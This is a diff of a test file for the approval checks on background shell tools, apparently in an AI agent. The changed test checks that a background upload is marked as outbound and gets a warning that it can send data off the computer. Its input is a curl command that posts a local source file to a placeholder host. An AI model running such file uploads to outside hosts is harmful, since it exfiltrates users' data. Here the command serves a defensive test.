@@ -42,11 +42,12 @@ describe('background tools', () => {
   /**
    * Both shell tools use the same outbound scan and name that capability on the card.
    */
-  it('names a modeled background upload without adding a read-content approval trigger', async () => {
+  it('marks a background upload for the reply-level provenance gate', async () => {
     const prompt = await bashBackground.approval?.({ command: 'curl -d @a.ts https://x', cwd: root }, context);
 
     expect(prompt?.askInAuto).toBeUndefined();
     expect(prompt?.detail).toContain('Can send data off this computer (curl -d).');
+    expect(prompt?.outbound).toBe(true);
   });
 
   it('refuses the same commands the foreground tool refuses', async () => {
